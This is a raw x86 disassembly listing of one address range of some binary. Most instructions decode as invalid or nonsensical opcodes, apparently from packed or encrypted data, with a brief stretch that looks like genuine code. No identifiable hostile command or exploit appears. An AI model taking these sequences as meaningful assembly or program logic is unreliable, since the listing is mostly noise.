  40eac4:	jmp    0x40ea54
  40eac6:	imul   edx,DWORD PTR [edx+0x1973f175],0x8b83fe94
  40ead0:	push   DWORD PTR ds:0x7cad9785
  40ead6:	jl     0x40ea7f
  40ead8:	jns    0x40eb56
  40eada:	jl     0x40ea78
  40eadc:	xchg   ecx,eax
  40eadd:	imul   ebx,esi,0x88367906
  40eae3:	scas   al,BYTE PTR es:[edi]
  40eae4:	fmul   DWORD PTR [eax-0x2e]
  40eae7:	outs   dx,DWORD PTR ds:[esi]
  40eae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eae9:	push   edx
  40eaea:	bswap  ebp
  40eaec:	pop    ebp
  40eaed:	sub    DWORD PTR [ecx+0x43],edi
  40eaf0:	add    BYTE PTR [ecx+edx*4+0x337671b1],ah
  40eaf7:	lea    edx,[edx+eax*4+0x58]
  40eafb:	inc    edi
  40eafc:	push   eax
  40eafd:	sub    cl,dl
  40eaff:	jne    0x40eb5c
  40eb01:	popf   
  40eb02:	and    ebp,DWORD PTR [ecx]
  40eb04:	loope  0x40eb81
  40eb06:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40eb08:	jo     0x40eade
  40eb0a:	(bad)  
  40eb0b:	xor    BYTE PTR [edi+0x1f],0xc2
  40eb0f:	xlat   BYTE PTR ds:[ebx]
  40eb10:	ins    DWORD PTR es:[edi],dx
  40eb11:	mov    bl,0x12
  40eb13:	loope  0x40eab9
  40eb15:	call   FWORD PTR [esi+0xf]
  40eb18:	xchg   esi,eax
  40eb19:	push   ebx
  40eb1a:	sub    eax,0xaf18d87f
  40eb1f:	jns    0x40eb0f
  40eb21:	push   eax
  40eb22:	xor    eax,0x2b6a47e2
  40eb27:	imul   edi,DWORD PTR [ecx],0x9951e427
  40eb2d:	inc    edx
  40eb2e:	in     al,dx
  40eb2f:	jle    0x40eafb
  40eb31:	push   0xc765086
  40eb36:	sub    DWORD PTR [ecx+0x8fe3eb4],edi
  40eb3c:	cmp    DWORD PTR [ebx-0x21],0x1d
  40eb40:	jbe    0x40eb4c
  40eb42:	jne    0x40eb87
  40eb44:	shl    BYTE PTR [ecx-0x4f],cl
  40eb47:	add    BYTE PTR [edi+0xe],bh
  40eb4a:	pusha  
  40eb4b:	sahf   
  40eb4c:	mov    ebp,0xaa4c2b08
  40eb51:	and    cl,BYTE PTR [edx+esi*4]
  40eb54:	dec    ecx
  40eb55:	jne    0x40eb03
  40eb57:	fs push ebp
  40eb59:	cmc    
  40eb5a:	adc    ch,BYTE PTR [edi-0x78]
  40eb5d:	mov    esi,0x4f8959ae
  40eb62:	sub    DWORD PTR [edx],0xcd8800bd
  40eb68:	jo     0x40eb51
  40eb6a:	aas    
  40eb6b:	add    esp,DWORD PTR [edx-0x6f]
  40eb6e:	push   es
  40eb6f:	sbb    eax,0x60f5634f
  40eb74:	mov    bl,0xc0
  40eb76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb77:	mov    esp,eax
  40eb79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb7a:	repnz ds fst st(6)
  40eb7e:	out    dx,eax
  40eb7f:	enter  0xe3e6,0x27
  40eb83:	cld    
  40eb84:	lods   al,BYTE PTR ds:[esi]
  40eb85:	(bad)  
  40eb86:	aad    0xc
  40eb88:	fisubr DWORD PTR [esi-0x68ec0f2d]
  40eb8e:	add    dl,0x75
  40eb91:	jp     0x40eb74
  40eb93:	dec    ecx
  40eb94:	add    edx,ebp
  40eb96:	sub    bh,bh
  40eb98:	add    eax,0x2d859e5c
  40eb9d:	aaa    
  40eb9e:	pop    ebp
  40eb9f:	push   sp
  40eba1:	mov    dh,BYTE PTR [edi-0x41]
  40eba4:	lods   eax,DWORD PTR ds:[esi]
  40eba5:	imul   BYTE PTR [ecx-0x1b]
  40eba8:	inc    esp
  40eba9:	mov    cl,0x76
  40ebab:	dec    eax
  40ebac:	(bad)  
  40ebad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebae:	or     DWORD PTR [ebp-0xb],ebx
  40ebb1:	in     eax,dx
  40ebb2:	clc    
  40ebb3:	xchg   BYTE PTR [ecx-0x14562e4d],bh
  40ebb9:	mov    WORD PTR [ecx+0x23913775],ss
  40ebbf:	inc    edx
  40ebc0:	sub    bl,BYTE PTR [edi+0x63]
  40ebc3:	and    DWORD PTR [eax-0x190a67f4],ebx
  40ebc9:	pop    ebx
  40ebca:	xchg   DWORD PTR [edi],eax
  40ebcc:	pop    ds
  40ebcd:	stos   BYTE PTR es:[edi],al
  40ebce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebcf:	ins    DWORD PTR es:[edi],dx
  40ebd0:	pop    esp
  40ebd1:	mov    esi,DWORD PTR [edx+0x171259b8]
  40ebd7:	sub    DWORD PTR [eax-0x27],esp
  40ebda:	add    BYTE PTR [esi-0x47],ah
  40ebdd:	into   
  40ebde:	push   es
  40ebdf:	mov    cl,0x7
  40ebe1:	(bad)  
  40ebe2:	inc    esi
  40ebe3:	imul   ebx,DWORD PTR [eax],0xffffffca
  40ebe6:	and    eax,0xfb0bacc3
  40ebeb:	xchg   edx,eax
  40ebec:	pop    ds
  40ebed:	cld    
  40ebee:	fcmovnu st,st(5)
  40ebf0:	xlat   BYTE PTR ds:[ebx]
  40ebf1:	cmp    eax,0x449f2e9e
  40ebf6:	mov    eax,ds:0x388b2cc5
  40ebfb:	pop    edx
  40ebfc:	inc    esp
  40ebfd:	dec    ebp
  40ebfe:	rol    BYTE PTR [esi],1
  40ec00:	xor    esp,0x2451631c
  40ec06:	inc    esi
  40ec07:	leave  
  40ec08:	addr16 in eax,0xa2
  40ec0b:	cwde   
  40ec0c:	hlt    
  40ec0d:	test   BYTE PTR [eax],cl
  40ec0f:	xor    ebp,DWORD PTR [eax]
  40ec11:	xor    eax,ecx
  40ec13:	add    edx,DWORD PTR [ecx+0x3de5bfe1]
  40ec19:	repnz test BYTE PTR [ebx-0x9946786],ch
  40ec20:	ret    0xfcaa
  40ec23:	ret    
  40ec24:	add    eax,0x131ac2c
  40ec29:	fdivr  DWORD PTR [edx-0x4922007e]
  40ec2f:	shl    DWORD PTR ds:0x172a9431,1
  40ec35:	ss push ds
  40ec37:	mov    ebp,0x388d5e16
  40ec3c:	push   cs
  40ec3d:	xchg   ecx,edi
  40ec3f:	push   0x69a9ece8
  40ec44:	retf   
  40ec45:	inc    dh
  40ec47:	xor    cl,bl
  40ec49:	sbb    edx,DWORD PTR [edx+0x44e2e0f3]
  40ec4f:	lea    ebx,[ebx-0x62dd6406]
  40ec55:	or     DWORD PTR [esi-0x7a0b76e9],esi
  40ec5b:	or     BYTE PTR [edx+0x35bc87bf],bl
  40ec61:	pop    ds
  40ec62:	enter  0x65e7,0xee
  40ec66:	lods   eax,DWORD PTR ds:[esi]
  40ec67:	fsubrp st(3),st
  40ec69:	adc    eax,0xa043779e
  40ec6e:	pusha  
  40ec6f:	fnstcw WORD PTR [ecx+edi*8]
  40ec72:	push   0x27835dd7
  40ec77:	ret    0x7996
  40ec7a:	xor    al,BYTE PTR [edi]
  40ec7c:	pop    ss
  40ec7d:	cld    
  40ec7e:	jmp    0xb0faef2a
  40ec83:	xor    eax,0xdca3fe7b
  40ec88:	ret    
  40ec89:	ror    edx,0xa0
  40ec8c:	les    edi,FWORD PTR [ebx]
  40ec8e:	outs   dx,BYTE PTR ds:[esi]
  40ec8f:	pop    es
  40ec90:	xor    eax,esi
  40ec92:	out    dx,eax
  40ec93:	(bad)  
  40ec94:	cld    
  40ec95:	cmp    esi,esi
  40ec97:	sbb    al,0x1f
  40ec99:	or     edi,ebp
  40ec9b:	add    al,0x2f
  40ec9d:	mov    al,0xf6
  40ec9f:	push   esi
  40eca0:	(bad)  
  40eca1:	shl    BYTE PTR [ecx+0x1],0x41
  40eca5:	enter  0x821b,0xc7
  40eca9:	rcr    DWORD PTR [esi],1
  40ecab:	out    0x1c,al
  40ecad:	push   eax
  40ecae:	int    0x26
  40ecb0:	jge    0x40ec7f
  40ecb2:	or     esi,DWORD PTR [ebp-0x14]
  40ecb5:	inc    eax
  40ecb6:	adc    al,0x9a
  40ecb8:	or     DWORD PTR [eax+0x1144b5a6],esp
  40ecbe:	jle    0x40ed22
  40ecc0:	push   ebp
  40ecc1:	test   DWORD PTR [eax+0x67],ebx
  40ecc4:	out    0x35,al
  40ecc6:	ret    0x5294
  40ecc9:	std    
  40ecca:	popf   
  40eccb:	cmp    BYTE PTR [edx+edx*4+0x5c79b744],0xf3
  40ecd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecd4:	and    esp,DWORD PTR [edi-0x770f000f]
  40ecda:	sar    BYTE PTR [edx+esi*4-0x3582b1d6],1
  40ece1:	popa   
  40ece2:	sub    edi,DWORD PTR [esi+0x7f31c4c9]
  40ece8:	clc    
  40ece9:	outs   dx,DWORD PTR ds:[esi]
  40ecea:	pop    eax
  40eceb:	mov    edi,0xf757f8a3
  40ecf0:	gs jecxz 0x40ec93
  40ecf3:	fst    QWORD PTR [ebp+edi*1-0x3]
  40ecf7:	scas   al,BYTE PTR es:[edi]
  40ecf8:	sar    DWORD PTR [edi-0x66],cl
  40ecfb:	mov    ch,0xbf
  40ecfd:	inc    ecx
  40ecfe:	js     0x40ec81
  40ed00:	neg    al
  40ed02:	adc    esp,DWORD PTR [edx+ebx*1+0x40]
  40ed06:	ret    
  40ed07:	in     eax,dx
  40ed08:	aas    
  40ed09:	stos   DWORD PTR es:[edi],eax
  40ed0a:	pop    edx
  40ed0b:	cmp    eax,0x4a944c70
  40ed10:	aam    0x77
  40ed12:	scas   eax,DWORD PTR es:[edi]
  40ed13:	ss pop ds
  40ed15:	(bad)  
  40ed16:	in     eax,dx
  40ed17:	ret    
  40ed18:	aas    
  40ed19:	cld    
  40ed1a:	xchg   edi,eax
  40ed1b:	arpl   WORD PTR [ecx+eiz*2+0x4e],di
  40ed1f:	pop    esp
  40ed20:	or     ecx,DWORD PTR [edx-0x202d858f]
  40ed26:	sbb    BYTE PTR [ecx+0x22],cl
  40ed29:	pop    ecx
  40ed2a:	dec    ecx
  40ed2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed2c:	sub    ebx,DWORD PTR [edx-0x19]
  40ed2f:	outs   dx,BYTE PTR ds:[esi]
  40ed30:	cwde   
  40ed31:	fmul   QWORD PTR [ebp-0x6c]
  40ed34:	shl    BYTE PTR [esi+0x7bae0c99],cl
  40ed3a:	test   eax,0xcd3ab1c1
  40ed3f:	jge    0x40ed1b
  40ed41:	dec    ecx
  40ed42:	nop
  40ed43:	sub    bl,ch
  40ed45:	aam    0xbe
  40ed47:	pop    eax
  40ed48:	sbb    eax,DWORD PTR [edx]
  40ed4a:	adc    al,0x10
  40ed4c:	mov    eax,ds:0xa91a6db9
  40ed51:	jae    0x40edce
  40ed53:	inc    edi
  40ed54:	fistp  QWORD PTR [eax+ebx*4-0x52f5a2c1]
  40ed5b:	mov    dh,0xd5
  40ed5d:	ret    0xa483
  40ed60:	dec    ecx
  40ed61:	inc    ecx
  40ed62:	lahf   
  40ed63:	nop
  40ed64:	push   0xcc580ee5
  40ed69:	retf   
  40ed6a:	fdiv   DWORD PTR [edx+0x48ef5728]
  40ed70:	pop    ebx
  40ed71:	jns    0x40eddf
  40ed73:	mov    edx,0x4ade8d1b
  40ed78:	(bad)  
  40ed79:	call   0x729d:0xe598611c
  40ed80:	and    BYTE PTR [edi-0x3b5eb74b],bl
  40ed86:	xchg   ecx,eax
  40ed87:	loopne 0x40ee02
  40ed89:	dec    ecx
  40ed8a:	add    eax,0x7dc72cc
  40ed8f:	xor    BYTE PTR [ebx-0x90594a7],dh
  40ed95:	sub    al,0x13
  40ed97:	ret    0xdc44
  40ed9a:	pop    es
  40ed9b:	push   0x13
  40ed9d:	xchg   ah,al
  40ed9f:	cmp    eax,0xa9088967
  40eda4:	and    esi,eax
  40eda6:	int3   
  40eda7:	outs   dx,DWORD PTR ds:[esi]
  40eda8:	js     0x40edff
  40edaa:	jnp    0x40edac
  40edac:	jge    0x40ed3b
  40edae:	cmp    esi,edi
  40edb0:	push   edi
  40edb1:	jno    0x40ed36
  40edb3:	and    ebp,DWORD PTR [edi+edi*4-0x66]
  40edb7:	lock jp 0x40ed5e
  40edba:	cmp    DWORD PTR [ebx+0x7d967f9],0x66
  40edc1:	dec    esi
  40edc2:	sbb    dh,BYTE PTR [ebx-0x7]
  40edc5:	xor    DWORD PTR [ebx+0x47],ecx
  40edc8:	inc    edi
  40edc9:	mov    dh,0x99
  40edcb:	clc    
  40edcc:	add    BYTE PTR [esi+0x8],ah
  40edcf:	xchg   esp,eax
  40edd0:	stos   DWORD PTR es:[edi],eax
  40edd1:	mov    ah,0x36
  40edd3:	pop    ds
  40edd4:	inc    ecx
  40edd5:	sub    DWORD PTR [edx+ebp*8],esi
  40edd8:	sbb    ah,cl
  40edda:	into   
  40eddb:	adc    edi,DWORD PTR [ecx]
  40eddd:	dec    ebp
  40edde:	(bad)  
  40eddf:	pop    ecx
  40ede0:	cmp    DWORD PTR [edx],0xfffffff9
  40ede3:	pop    esi
  40ede4:	mov    eax,0x285bc2cb
  40ede9:	mov    ah,0x68
  40edeb:	cmp    edi,esi
  40eded:	adc    esi,DWORD PTR [edi]
  40edef:	inc    edx
  40edf0:	xor    eax,0xeb78b412
  40edf5:	sub    ebp,ecx
  40edf7:	out    0x5,eax
  40edf9:	ds inc ebx
  40edfb:	jnp    0x40edc1
  40edfd:	sub    DWORD PTR [ecx],edi
  40edff:	and    BYTE PTR [edi+0x5c],0x8e
  40ee03:	push   ebx
  40ee04:	xor    cl,BYTE PTR [eax]
  40ee06:	pop    ss
  40ee07:	data16 cmp al,0x45
  40ee0a:	sbb    edx,DWORD PTR [esi+ebx*8+0x5a]
  40ee0e:	mov    es,WORD PTR [edi+0x2ca1d025]
  40ee14:	stos   BYTE PTR es:[edi],al
  40ee15:	dec    esi
  40ee16:	jle    0x40ee52
  40ee18:	and    al,BYTE PTR [ebp+0x6dece88b]
  40ee1e:	or     DWORD PTR [ebx-0x5a],edi
  40ee21:	inc    edi
  40ee22:	cmp    cl,bh
  40ee24:	push   ebx
  40ee25:	xor    DWORD PTR [ebp+0x52],edi
  40ee28:	xchg   ebp,eax
  40ee29:	dec    esp
  40ee2a:	xchg   esi,eax
  40ee2b:	aam    0x2e
  40ee2d:	ins    DWORD PTR es:[edi],dx
  40ee2e:	add    ah,dh
  40ee30:	pop    esi
  40ee31:	nop
  40ee32:	loop   0x40ede9
  40ee34:	pop    ss
  40ee35:	sbb    ch,dh
  40ee37:	sbb    al,0x42
  40ee39:	aas    
  40ee3a:	pop    ebx
  40ee3b:	xchg   BYTE PTR [eax],bh
  40ee3d:	push   eax
  40ee3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee3f:	hlt    
  40ee40:	std    
  40ee41:	mov    esp,0xfa7d3363
  40ee46:	push   0x38
  40ee48:	cs jge 0x40ee25
  40ee4b:	dec    esp
  40ee4c:	jne    0x40ee85
  40ee4e:	fcmovnbe st,st(5)
  40ee50:	rol    BYTE PTR [esp+edx*4],cl
  40ee53:	sub    DWORD PTR [ebx+0x68],eax
  40ee56:	mov    dl,0xab
  40ee58:	dec    edx
  40ee59:	dec    ebp
  40ee5a:	out    dx,eax
  40ee5b:	sbb    BYTE PTR [esi],al
  40ee5d:	cld    
  40ee5e:	mov    ?,WORD PTR [edx+0x7b]
  40ee61:	jp     0x40ee29
  40ee63:	push   ebp
  40ee64:	ror    BYTE PTR [ebp+0x56],0x63
  40ee68:	sbb    DWORD PTR [ebp-0xa],ebp
  40ee6b:	sbb    esp,DWORD PTR [edi-0x55f38055]
  40ee71:	and    DWORD PTR [edx+0xb88f09d],esp
  40ee77:	ins    DWORD PTR es:[edi],dx
  40ee78:	outs   dx,BYTE PTR ds:[esi]
  40ee79:	inc    edi
  40ee7a:	icebp  
  40ee7b:	adc    al,0xd7
  40ee7d:	stc    
  40ee7e:	mov    ds:0x1348553f,al
  40ee83:	jmp    DWORD PTR [ebx+0x413b9a]
  40ee89:	mov    eax,DWORD PTR [ebp-0x4]
  40ee8c:	xor    eax,edi
  40ee8e:	add    eax,esi
  40ee90:	mov    ds:0x413b92,eax
  40ee95:	jmp    0x40f25b
  40ee9a:	push   edi
  40ee9b:	mov    DWORD PTR ds:0x7d73cde7,eax
  40eea1:	test   eax,0x57232fd2
  40eea6:	pop    edi
  40eea7:	mov    ch,0x9
  40eea9:	or     eax,0x7c7ca93e
  40eeae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eeaf:	jns    0x40ef2d
  40eeb1:	jl     0x40eebe
  40eeb3:	(bad)  
  40eeb4:	mov    ah,0xbf
  40eeb6:	aaa    
  40eeb7:	pop    ds
  40eeb8:	jle    0x40ee42
  40eeba:	cdq    
  40eebb:	dec    esp
  40eebc:	mov    edx,ebx
  40eebe:	out    dx,eax
  40eebf:	sbb    al,0x36
  40eec1:	aaa    
  40eec2:	sbb    DWORD PTR ss:[edx],edx
  40eec5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eec6:	sub    esi,DWORD PTR [edx]
  40eec8:	lods   al,BYTE PTR ds:[esi]
  40eec9:	inc    esp
  40eeca:	cs dec edx
  40eecc:	ret    0x3cd9
  40eecf:	dec    ebx
  40eed0:	adc    eax,0x6da58eb8
  40eed5:	idiv   BYTE PTR [ecx]
  40eed7:	push   ecx
  40eed8:	enter  0x57ec,0xd1
  40eedc:	sbb    eax,0xd464c2c7
  40eee1:	sbb    BYTE PTR [esi-0x137a30fc],bl
  40eee7:	jmp    0x40ef1a
  40eee9:	scas   al,BYTE PTR es:[edi]
  40eeea:	ins    DWORD PTR es:[edi],dx
  40eeeb:	retf   0x6359
  40eeee:	jge    0x40ef62
  40eef0:	xor    al,0xb4
  40eef2:	pop    ds
  40eef3:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eef5:	pop    esi
  40eef6:	jmp    0x48b3b0c5
  40eefb:	or     BYTE PTR [ebx+0x724e7897],al
  40ef01:	sbb    BYTE PTR [ebx],dl
  40ef03:	mov    ds:0xdefd957,eax
  40ef08:	pusha  
  40ef09:	mov    ebx,0x1ee7922b
  40ef0e:	(bad)  
  40ef0f:	push   ss
  40ef10:	mov    cl,0x96
  40ef12:	sub    DWORD PTR [esi+0x58],0x5be3cf94
  40ef19:	xor    edx,DWORD PTR [ebp+edx*1+0x1]
  40ef1d:	jg     0x40ef05
  40ef1f:	push   edx
  40ef20:	adc    eax,0x330e7278
  40ef25:	inc    ecx
  40ef26:	xchg   edi,eax
  40ef27:	repnz cmp BYTE PTR [esi-0x47b617f0],dh
  40ef2e:	arpl   WORD PTR [edi],sp
  40ef30:	mov    edi,DWORD PTR [ecx]
  40ef32:	inc    edi
  40ef33:	push   edi
  40ef34:	fadd   DWORD PTR [edi]
  40ef36:	or     eax,ebp
  40ef38:	xor    eax,0x3b5c1e5b
  40ef3d:	xchg   ebx,eax
  40ef3e:	jmp    ecx
  40ef40:	rcr    BYTE PTR [ecx],0x68
  40ef43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef44:	inc    edx
  40ef45:	dec    ebx
  40ef46:	push   0xffffff8a
  40ef48:	ins    DWORD PTR es:[edi],dx
  40ef49:	fwait
  40ef4a:	lods   eax,DWORD PTR ds:[esi]
  40ef4b:	or     DWORD PTR [ecx],eax
  40ef4d:	cwde   
  40ef4e:	stc    
  40ef4f:	add    DWORD PTR [ebx+0x426d0043],esi
  40ef55:	outs   dx,DWORD PTR ds:[esi]
  40ef56:	xchg   esp,eax
  40ef58:	int    0x32
  40ef5a:	ret    0x7f5a
  40ef5d:	push   ebp
  40ef5e:	int    0xd7
  40ef60:	outs   dx,BYTE PTR ds:[esi]
  40ef61:	sbb    eax,0x6a361703
  40ef66:	cmp    ah,BYTE PTR [esp+edi*8]
  40ef69:	ins    DWORD PTR es:[edi],dx
  40ef6a:	or     DWORD PTR [ecx+0xc],ecx
  40ef6d:	leave  
  40ef6e:	iret   
  40ef6f:	sbb    eax,ebx
  40ef71:	std    
  40ef72:	aam    0x44
  40ef74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef75:	or     al,0x75
  40ef77:	gs add esi,edi
  40ef7a:	pop    ss
  40ef7b:	gs (bad) 
  40ef7d:	ja     0x40ef88
  40ef7f:	push   edi
  40ef80:	jg     0x40ef4b
  40ef82:	out    0x9f,eax
  40ef84:	inc    ebp
  40ef85:	loopne 0x40eff3
  40ef87:	push   ecx
  40ef88:	cmp    bl,ah
  40ef8a:	xor    DWORD PTR [ecx+0x1dfe8884],ebx
  40ef90:	sub    edx,eax
  40ef92:	xchg   edx,eax
  40ef93:	out    0xd4,al
  40ef95:	xor    edi,DWORD PTR [edx]
  40ef97:	mov    esp,0xc4d6fe2a
  40ef9c:	je     0x40effb
  40ef9e:	push   eax
  40ef9f:	cmp    al,0xa1
  40efa1:	pushf  
  40efa2:	or     DWORD PTR [esi],edi
  40efa4:	push   ebp
  40efa5:	and    eax,0x14e6e71a
  40efaa:	imul   ecx,DWORD PTR [edi],0x93f975ea
  40efb0:	mov    ecx,?
  40efb2:	(bad)  
  40efb3:	cmp    cl,BYTE PTR [ebp+0x7d5146f2]
  40efb9:	jmp    0xaa089045
  40efbe:	xor    bl,bl
  40efc0:	(bad)  
  40efc1:	lods   eax,DWORD PTR ds:[esi]
  40efc2:	push   ebx
  40efc3:	mov    dh,0xc9
  40efc5:	lahf   
  40efc6:	cmp    dl,BYTE PTR [ebp+ecx*4-0x572c42c5]
  40efcd:	add    edi,DWORD PTR ds:0x49f66010
  40efd3:	scas   al,BYTE PTR es:[edi]
  40efd4:	(bad)  
  40efd5:	hlt    
  40efd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efd7:	(bad)  
  40efd8:	xchg   ebx,eax
  40efd9:	sahf   
  40efda:	test   al,0xfb
  40efdc:	mov    edx,edi
  40efde:	aad    0x9d
  40efe0:	xchg   ebx,eax
  40efe1:	popf   
  40efe2:	cwde   
  40efe3:	call   0x5dfa:0x458a0799
  40efea:	and    eax,0x81c33fdf
  40efef:	es sahf 
  40eff1:	push   ebp
  40eff2:	imul   DWORD PTR [edx+0x3d]
  40eff5:	mov    esp,0xe425a79b
  40effa:	stos   BYTE PTR es:[edi],al
  40effb:	loop   0x40efd8
  40effd:	fadd   QWORD PTR [ebx+0x9]
  40f000:	mov    ds:0x8f7ff50a,al
  40f005:	xchg   ebx,eax
  40f006:	cmp    BYTE PTR [ecx+0x9d1429e],al
  40f00c:	push   esi
  40f00d:	pop    ds
  40f00e:	sbb    DWORD PTR [ecx+0x3057f409],0xfd67407c
  40f018:	pop    ebp
  40f019:	and    al,0x13
  40f01b:	cmp    eax,0x6ff83a7f
  40f020:	repz and bh,BYTE PTR [ebp-0x4608830f]
  40f027:	pop    eax
  40f028:	movs   BYTE PTR es:[di],BYTE PTR es:[si]
  40f02b:	(bad)  
  40f02c:	push   edx
  40f02d:	pop    edx
  40f02e:	and    BYTE PTR [esi+0x4920ddfa],bl
  40f034:	ss cdq 
  40f036:	mov    ds:0xdf8c6909,eax
  40f03b:	outs   dx,DWORD PTR ds:[esi]
  40f03c:	sub    ebp,DWORD PTR [edi]
  40f03e:	xor    edx,DWORD PTR [esi]
  40f040:	mov    dh,0x23
  40f042:	cmc    
  40f043:	ror    DWORD PTR [ebp+0x6e],1
  40f046:	sub    BYTE PTR [esi-0x39],dh
  40f049:	mov    al,es:0xc673f4b0
  40f04f:	xchg   edx,eax
  40f050:	pop    esi
  40f051:	sub    ebp,DWORD PTR [eax+ebp*4-0x15]
  40f055:	jo     0x40f032
  40f057:	xlat   BYTE PTR ds:[ebx]
  40f058:	or     ax,0xf4db
  40f05c:	adc    eax,0x4f29e274
  40f061:	or     al,0xcf
  40f063:	ret    
  40f064:	pop    ds
  40f065:	pop    ebx
  40f066:	imul   DWORD PTR [ecx+0x52]
  40f069:	popf   
  40f06a:	cdq    
  40f06b:	fsubr  QWORD PTR [edx+0x15dc7fac]
  40f071:	xchg   bl,al
  40f073:	retf   0x64bf
  40f076:	jne    0x40f0d4
  40f078:	xor    BYTE PTR [edx],dl
  40f07a:	mov    ebx,0x569c5d76
  40f07f:	test   al,0x5a
  40f081:	push   edi
  40f082:	dec    esp
  40f083:	push   DWORD PTR [edi]
  40f085:	pop    ss
  40f086:	xchg   ebp,eax
  40f087:	jb     0x40f0bd
  40f089:	mov    edi,0xd57ed803
  40f08e:	jnp    0x40f0f0
  40f090:	mov    ch,0x43
  40f092:	add    al,BYTE PTR [ebx-0x7b2d96ef]
  40f098:	jle    0x40f0e2
  40f09a:	push   ds
  40f09b:	(bad)  
  40f09d:	jle    0x40f041
  40f09f:	lea    ebp,[eax+0x7b5e9b4f]
  40f0a5:	popf   
  40f0a6:	stos   DWORD PTR es:[edi],eax
  40f0a7:	je     0x40f045
  40f0a9:	and    eax,0x7b21f5d1
  40f0ae:	pop    ebx
  40f0af:	push   ebp
  40f0b0:	sbb    BYTE PTR [ecx],cl
  40f0b2:	fiadd  DWORD PTR [edi+0x38cbfd01]
  40f0b8:	inc    ecx
  40f0b9:	mov    ecx,0x585484cd
  40f0be:	sbb    DWORD PTR [edx+edx*8],esp
  40f0c1:	and    edx,DWORD PTR [ebp+0x5e42f416]
  40f0c7:	(bad)  
  40f0c8:	(bad)  
  40f0ca:	push   ecx
  40f0cb:	push   es
  40f0cc:	(bad)  
  40f0cd:	mov    edx,0x938ed15d
  40f0d2:	or     al,0x10
  40f0d4:	sbb    ebx,edx
  40f0d6:	mov    BYTE PTR [edx],dh
  40f0d8:	hlt    
  40f0d9:	add    DWORD PTR [edi+0x6a505f37],0x6
  40f0e0:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0e2:	mov    bl,0xff
  40f0e5:	test   ebx,0x4fd67386
  40f0eb:	or     DWORD PTR [ebp-0xe78e40d],ebp
  40f0f1:	mov    ss,WORD PTR [edi+0x20]
  40f0f4:	or     ebp,edi
  40f0f6:	inc    edi
  40f0f7:	xor    eax,0x896f8a9
  40f0fc:	mov    ds:0x2cb779ec,eax
  40f101:	or     DWORD PTR [ebx],eax
  40f103:	push   edx
  40f104:	pop    esi
  40f105:	dec    esp
  40f106:	mov    dh,0xdc
  40f108:	push   ebp
  40f109:	push   es
  40f10a:	cs enter 0xd2a7,0x15
  40f10f:	fisttp DWORD PTR [ecx]
  40f111:	adc    eax,0x7eb4821f
  40f116:	clc    
  40f117:	imul   eax,DWORD PTR cs:[ebx-0x40],0x4a
  40f11c:	gs ss sbb eax,0xd5643055
  40f123:	push   esp
  40f124:	mov    dl,0xfe
  40f126:	(bad)  [ecx-0x11]
  40f129:	popa   
  40f12a:	jg     0x40f15e
  40f12c:	xchg   ebp,eax
  40f12d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f12e:	pop    es
  40f12f:	add    eax,edx
  40f131:	shr    DWORD PTR [edx],0x5
  40f134:	rol    DWORD PTR [ecx+0x7ab75e65],0x9b
  40f13b:	xor    eax,0x8635d8b9
  40f140:	adc    al,BYTE PTR [edi]
  40f142:	(bad)  
  40f143:	and    DWORD PTR [ebx+0x185ea2e7],edi
  40f149:	inc    edi
  40f14a:	fistp  DWORD PTR [eax-0x46]
  40f14d:	(bad)  
  40f14e:	xor    eax,0x4179d369
  40f153:	and    si,WORD PTR [ecx]
  40f156:	fs jb  0x40f0ea
  40f159:	outs   dx,DWORD PTR ds:[esi]
  40f15a:	or     eax,0x304f4726
  40f15f:	nop
  40f160:	enter  0x695f,0x6a
  40f164:	aam    0x55
  40f166:	push   es
  40f167:	loop   0x40f16a
  40f169:	push   es
  40f16a:	out    dx,eax
  40f16b:	and    eax,0xb54e00a6
  40f170:	aas    
  40f171:	int3   
  40f172:	xchg   esp,eax
  40f173:	shr    DWORD PTR [edi+ebp*2],1
  40f176:	mov    ebx,0x6f18a562
  40f17b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f17c:	int3   
  40f17d:	ret    0x3160
  40f180:	xchg   esp,eax
  40f181:	mov    ebx,0xb3e8b490
  40f186:	pop    edi
  40f187:	pop    ds
  40f188:	(bad)  
  40f189:	fadd   QWORD PTR [ecx+0x34d5d3e8]
  40f18f:	pop    ebp
  40f190:	add    eax,DWORD PTR [eax-0x4d]
  40f193:	aas    
  40f194:	xchg   ecx,eax
  40f195:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f196:	push   eax
  40f197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f198:	push   es
  40f199:	sar    BYTE PTR [edi+0x1d26accb],cl
  40f19f:	iret   
  40f1a0:	jecxz  0x40f173
  40f1a2:	sub    esi,DWORD PTR [edx+0x7]
  40f1a5:	dec    esp
  40f1a6:	aam    0x10
  40f1a8:	test   al,0x78
  40f1aa:	in     al,dx
  40f1ab:	imul   edi,esi,0x36
  40f1ae:	adc    eax,ecx
  40f1b0:	(bad)  
  40f1b2:	rcl    BYTE PTR ds:0x6a42ec3c,1
  40f1b8:	cmp    eax,0xfc8f0c31
  40f1bd:	mul    ebx
  40f1bf:	jge    0x40f1a1
  40f1c1:	inc    eax
  40f1c2:	sbb    cl,BYTE PTR [eax-0x5d]
  40f1c5:	lds    esi,FWORD PTR [ebp-0x2e]
  40f1c8:	jl     0x40f1ab
  40f1ca:	test   DWORD PTR [ecx-0x11],0xcea04960
  40f1d1:	inc    eax
  40f1d2:	lods   al,BYTE PTR ds:[esi]
  40f1d3:	push   esi
  40f1d4:	or     al,0xf4
